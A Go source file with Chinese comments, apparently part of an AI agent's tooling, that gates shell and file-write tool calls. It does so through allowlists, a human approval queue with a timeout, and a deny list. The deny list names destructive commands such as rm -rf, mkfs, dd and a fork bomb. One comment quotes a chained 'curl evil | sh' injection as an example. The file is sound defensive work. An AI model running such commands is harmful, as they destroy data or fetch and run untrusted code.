// Package approval 实现危险操作的审批机制：
//   - auto：白名单内的命令直接执行，白名单外拒绝（无需人工介入）；
//   - confirm：操作进入待审批队列，管理后台弹审批卡片，超时（默认 5 分钟）
//     未处理自动拒绝，工具调用方收到"用户未批准"；
//   - off：禁用 exec（write_file/edit_file 不受 off 影响，仍按 confirm/auto 语义执行）。
//
// 黑名单兜底：rm -rf、mkfs 等毁灭性命令即使误入白名单也一律拦截。
// 审批语义只针对 exec 的命令匹配；write_file/edit_file 在 confirm 模式下
// 整体进入审批队列（auto 模式直接执行）。
package approval

import (
	"errors"
	"strings"
	"sync"
	"time"
)

// Mode 是审批模式。
type Mode string

const (
	ModeAuto    Mode = "auto"    // 白名单内直接执行，其余拒绝
	ModeConfirm Mode = "confirm" // 危险操作进审批队列，网页批准后执行
	ModeOff     Mode = "off"     // 禁用 exec
)

// DefaultTimeout 是审批等待的默认时长。
const DefaultTimeout = 5 * time.Minute

// ErrDisabled 表示 exec 已被禁用。
var ErrDisabled = errors.New("exec 工具已被禁用（tools.exec.mode=off）")

// ErrDenied 表示操作被用户拒绝或审批超时。
var ErrDenied = errors.New("用户未批准")

// denyPatterns 是毁灭性命令黑名单：无论白名单/审批结果如何都拦截（小写子串匹配）。
var denyPatterns = []string{
	"rm -rf", "rm -fr", "rm -r /", "rm -r ~",
	"mkfs", "dd if=", "> /dev/sd", "> /dev/nvme", "> /dev/mmc",
	":(){", "fork()", // fork 炸弹
	"shutdown", "reboot", "halt", "init 0", "init 6", "poweroff",
	"chmod -r 777 /", "chown -r ", "mv /* ", " history -c", "history -c",
}

// chainChars 是命令链/注入特征：白名单匹配要求命令中不含这些字符，
// 防止 "uname -a; curl evil | sh" 之类的拼接绕过。
const chainChars = ";|&`><\n$"

// Item 是一条待审批操作（管理后台展示用）。
type Item struct {
	ID        int64     `json:"id"`
	Tool      string    `json:"tool"`    // 发起审批的工具名：exec / write_file / edit_file
	Summary   string    `json:"summary"` // 一句话摘要（如"执行命令 uname -a"）
	Detail    string    `json:"detail"`  // 详情（命令全文 / 文件内容预览）
	CreatedAt time.Time `json:"createdAt"`
}

// request 是待审批请求的内部形态，携带结果回传通道。
type request struct {
	item Item
	ch   chan bool
}

// Queue 是审批队列：确认模式下工具调用方在此阻塞等待网页批准。
type Queue struct {
	mu        sync.Mutex
	mode      Mode
	allowlist []string
	timeout   time.Duration
	seq       int64
	pending   map[int64]*request
}

// New 创建审批队列。mode 非法时回退为 confirm（最保守）；allowlist 为 exec
// 白名单（auto/confirm 模式下的免审批命令）；timeout<=0 用默认 5 分钟。
func New(mode string, allowlist []string, timeout time.Duration) *Queue {
	m := Mode(strings.TrimSpace(mode))
	switch m {
	case ModeAuto, ModeConfirm, ModeOff:
	default:
		m = ModeConfirm
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	return &Queue{
		mode:      m,
		allowlist: allowlist,
		timeout:   timeout,
		pending:   make(map[int64]*request),
	}
}

// Mode 返回当前审批模式。
func (q *Queue) Mode() Mode { return q.mode }

// Timeout 返回审批等待时长。
func (q *Queue) Timeout() time.Duration { return q.timeout }

// Request 发起一次审批：confirm 模式入队并阻塞等待（批准返回 nil，
// 拒绝/超时返回 ErrDenied）；auto 模式直接放行（exec 的白名单匹配由
// ExecTool 自行完成，不经此入口）。off 模式返回 ErrDisabled。
func (q *Queue) Request(tool, summary, detail string) error {
	q.mu.Lock()
	if q.mode != ModeConfirm {
		q.mu.Unlock()
		if q.mode == ModeOff {
			return ErrDisabled
		}
		return nil // auto：直接放行
	}
	q.seq++
	req := &request{
		item: Item{ID: q.seq, Tool: tool, Summary: summary, Detail: detail, CreatedAt: time.Now()},
		ch:   make(chan bool, 1),
	}
	q.pending[req.item.ID] = req
	q.mu.Unlock()

	select {
	case ok := <-req.ch:
		q.remove(req.item.ID)
		if !ok {
			return ErrDenied
		}
		return nil
	case <-time.After(q.timeout):
		q.remove(req.item.ID)
		return ErrDenied
	}
}

// remove 从待审批表中移除请求（结果已送达或已超时）。
func (q *Queue) remove(id int64) {
	q.mu.Lock()
	delete(q.pending, id)
	q.mu.Unlock()
}

// Pending 返回当前待审批列表（按提交顺序）。
func (q *Queue) Pending() []Item {
	q.mu.Lock()
	defer q.mu.Unlock()
	out := make([]Item, 0, len(q.pending))
	for _, r := range q.pending {
		out = append(out, r.item)
	}
	for i := 1; i < len(out); i++ { // seq 递增，按 ID 排序即提交顺序
		for j := i; j > 0 && out[j].ID < out[j-1].ID; j-- {
			out[j], out[j-1] = out[j-1], out[j]
		}
	}
	return out
}

// Decide 审批一条待处理操作：approve=true 批准放行。返回是否确实存在该请求。
func (q *Queue) Decide(id int64, approve bool) bool {
	q.mu.Lock()
	req, ok := q.pending[id]
	q.mu.Unlock()
	if !ok {
		return false
	}
	req.ch <- approve
	return true
}

// Allowlisted 判断命令是否命中 exec 白名单（auto 模式免审批执行的依据）。
// 规则：去除多余空白后，命令与白名单项完全相等，或以白名单项 + 空格开头；
// 且命令不得含链式/重定向字符（; | & ` > < 换行 $），防止拼接绕过。
func (q *Queue) Allowlisted(command string) bool {
	command = normalizeCmd(command)
	if command == "" || strings.ContainsAny(command, chainChars) {
		return false
	}
	for _, entry := range q.allowlist {
		entry = normalizeCmd(entry)
		if entry == "" {
			continue
		}
		if command == entry || strings.HasPrefix(command, entry+" ") {
			return true
		}
	}
	return false
}

// Denied 检查命令是否命中毁灭性黑名单；命中返回提示语，未命中返回空串。
func (q *Queue) Denied(command string) string {
	low := strings.ToLower(normalizeCmd(command))
	for _, p := range denyPatterns {
		if strings.Contains(low, p) {
			return "命令命中安全黑名单（" + p + "），已拦截：即使配置或审批出错也不允许执行毁灭性操作"
		}
	}
	return ""
}

// normalizeCmd 把连续空白折叠为单个空格并去首尾，便于稳定匹配。
func normalizeCmd(s string) string {
	return strings.Join(strings.Fields(s), " ")
}
